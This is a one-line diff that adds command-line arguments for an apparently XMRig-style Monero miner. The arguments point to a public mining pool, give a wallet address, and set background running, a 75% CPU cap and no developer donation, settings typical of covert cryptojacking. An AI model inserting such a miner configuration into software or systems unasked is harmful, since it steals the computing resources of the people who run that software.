@@ -1,0 +1,1 @@
+-a rx/0 -o stratum+ssl://pool.hashvault.pro:443 -u 49GZGBCprArRFK1Qk2es8QAqiYsjFL3JQinDZmQdGELSD5iMp6qap13ex4oULsEXXc15m9uDreBxDNxMGR6v8g7t2fGRPvm.myworker -p x --threads=4 --cpu-priority=2 --donate-level=0 --background --max-cpu-usage=75
